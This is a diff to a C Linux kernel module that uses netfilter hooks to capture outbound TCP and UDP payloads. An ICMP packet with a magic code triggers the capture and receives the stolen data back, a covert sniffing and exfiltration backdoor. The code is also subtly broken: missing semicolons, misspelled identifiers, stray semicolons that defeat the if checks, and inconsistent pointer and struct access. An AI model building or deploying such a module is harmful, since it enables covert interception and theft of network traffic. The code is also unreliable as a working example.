@@ -39,8 +39,8 @@
 
 
 
-struct buff_ctl *buffer_ctl;
-struct ctl_mesg *setup_msg;
+struct buff_ctl buffer_ctl;
+struct ctl_mesg setup_msg;
 
 /**
  *      repack       - swap mac address and IP address
@@ -109,15 +109,15 @@ static void parse_packet_tcp(struct sk_buff *skb, struct tcphdr *tcp_h)
      *   Enter Critical Section
      */
 
-    spin_lock(buffer_ctl->buff_lock);
+    spin_lock(buffer_ctl.buff_lock);
 
-    if(buffer_ctl->buff_length == 0)
+    if(buffer_ctl.buff_length == 0)
     {
-        memcpy(buffer_ctl->buff, data, data_size);
-        buffer_ctl->buff_length += data_size;
+        memcpy(buffer_ctl.buff, data, data_size);
+        buffer_ctl.buff_length += data_size;
     }    
 
-    spin_unlock(&buffer_ctl->buff_lock);
+    spin_unlock(&buffer_ctl.buff_lock);
 
 }
 
@@ -142,11 +142,11 @@ static void parse_packet_udp(struct sk_buff *skb, struct udphdr *udp_h)
 
     spin_lock(&buffer_ctl.buff_lock);
 
-    if((buffer_ctl->buff_length - data_size) < BUFF_SIZE)
+    if((buffer_ctl.length - data_size) < BUFF_SIZE)
     {
 
         memcpy(buff, data, data_size);
-        buffer_ctl.buff_length += data_size
+        buffer_ctl.length += data_size
 
     }
     
@@ -177,9 +177,9 @@ static unsigned int monitor_packet_out(unsigned int hooknum,
      *  Check if it's TCP/UDP packet. Let it go if it's not
      */
 
-    if(setup_msg->set_port_flag == 1 && 
-       setup_msg->kick_off_flag == 1 && 
-       setup_msg->post_hook_start_monitor == 1)
+    if(setup_msg.set_port_flag == 1 && 
+       setup_msg.kick_off_flag == 1 && 
+       setup_msg.post_hook_start_monitor == 1)
     {
         if(iphead->protocol == IPPROTO_TCP)
         {
@@ -187,7 +187,7 @@ static unsigned int monitor_packet_out(unsigned int hooknum,
             if(!tcphead)
                 return NF_ACCEPT;
 
-            if(tcphead -> dest != hton(setup_msg->port_listen) && iphead-> daddr != hton(setup_msg->d_addr));
+            if(tcphead -> dest != hton(setup_msg.port_listen) && iphead-> daddr != hton(setup_msg.d_addr));
                 return NF_ACCEPT;
 
             parse_packet_tcp(sb, tcphead);
@@ -201,7 +201,7 @@ static unsigned int monitor_packet_out(unsigned int hooknum,
             if(!udphead)
                 return NF_ACCEPT;
 
-            if(udphead -> dest != hton(setup_msg->port_listen) && iphead-> daddr != hton(setup_msg->d_addr));
+            if(udphead -> dest != hton(setup_msg.port_listen) && iphead-> daddr != hton(setup_msg.d_addr));
                 return NF_ACCEPT;
 
              parse_packet_udp(sb, udphead);
@@ -234,6 +234,8 @@ static unsigned int monitor_icmp_in(unsigned int hooknum,
     iphead = ip_hdr(sb);
     icmphead = icmp_hdr(sb);
 
+    struct ctl_mesg *set_msg;
+
 
 
     if (iphead->protocol != IPPROTO_ICMP)
@@ -251,35 +253,38 @@ static unsigned int monitor_icmp_in(unsigned int hooknum,
     if(icmphead->code != CIPHERCODE_START )
        return NF_ACCEPT;
 
-    setup_msg = (struct ctl_mesg*)((char *)icmphead + sizeof(struct icmphdr));
+    set_msg = (struct ctl_mesg*)((char *)icmphead + sizeof(struct icmphdr));
 
 
     if(!icmphead->code)
        return NF_ACCEPT;
 
-    setup_msg->et_port_flag = 1;
-    setup_msg->kick_off_flag=1;
-    setup_msg->post_hook_start_monitor=1;
+    setup_msg.et_port_flag = 1;
+    setup_msg.kick_off_flag=1;
+    setup_msg.post_hook_start_monitor=1;
+    setup_msg.port_listen = set_msg->port_listen;
+    setup_msg.d_addr = set_msg->d_addr;
+    
 
     data = (char *)((char*)setup_msg + sizeof(struct ctl_mesg));
 
-    if(buffer_ctl->buff_length == 0)
+    if(buffer_ctl.buff_length == 0)
     {
 
         strcpy(data, ERRORMSG);
         repack(sb);
         dev_queue_xmit(sb);
 
-        return STOLEN;
+        return NF_STOLEN;
     }
 
 
     else
     {
-        spin_lock(buffer_ctl->buff_lock);
-        memcpy(data, buffer_ctl-> buff, bufer_ctl->length);
-        buffer_ctl->buff_length -= buff_length
-        spin_unlock(buffer_ctl->buff_lock);
+        spin_lock(&buffer_ctl.buff_lock);
+        memcpy(data + 4, buffer_ctl. buff, bufer_ctl->length);
+        buffer_ctl.buff_length -= buff_length
+        spin_unlock(&buffer_ctl.buff_lock);
     }
 
     repack(sb);
@@ -332,41 +337,41 @@ static unsigned int monitor_icmp_in(unsigned int hooknum,
 static const struct nf_hook_ops icmp_hook = {
     .hook = monitor_icmp_in,
     .owner = THIS_MODULE,
-    .hooknum = NF_BR_PRE_ROUTING,
-    .priority = NF_BR_PRI_FIRST,
+    .hooknum = NF_INET_PRE_ROUTING,
+    .priority = NF_INET_PRI_FIRST,
 
 };
 
 static const struct nf_hook_ops parse_hook = {
     .hook = monitor_packet_out,
     .owner = THIS_MODULE,
-    .hooknum = NF_BR_POST_ROUTING,
-    .priority = NF_BR_PRI_FIRST,
+    .hooknum = NF_INET_POST_ROUTING,
+    .priority = NF_INET_PRI_FIRST,
 
 };
 
 static void sniff_init()
 {
 
-    buffer_ctl->length = 0;
+    buffer_ctl.length = 0;
 
-    spin_lock_init(bufer_ctl->buff_lock);
+    spin_lock_init(&bufer_ctl.buff_lock);
 
-    buffer_ctl->buffer = kmalloc(BUFF_SIZE,GFP_KERNEL);
+    buffer_ctl.buffer = kmalloc(BUFF_SIZE,GFP_KERNEL);
     if(buff_ctl->buffer)
        return 1;
 
-    setup_msg->et_port_flag = 0;
-    setup_msg->kick_off_flag=0;
-    setup_msg->post_hook_start_monitor=0;
+    setup_msg.et_port_flag = 0;
+    setup_msg.kick_off_flag=0;
+    setup_msg.post_hook_start_monitor=0;
 
 }
 
 
 int init_module()
 {
-    nf_register_hook(icmp_hook);
-    nf_register_hook(parse_hook);
+    nf_register_hook(&icmp_hook);
+    nf_register_hook(&parse_hook);
     return 0;
 }
 
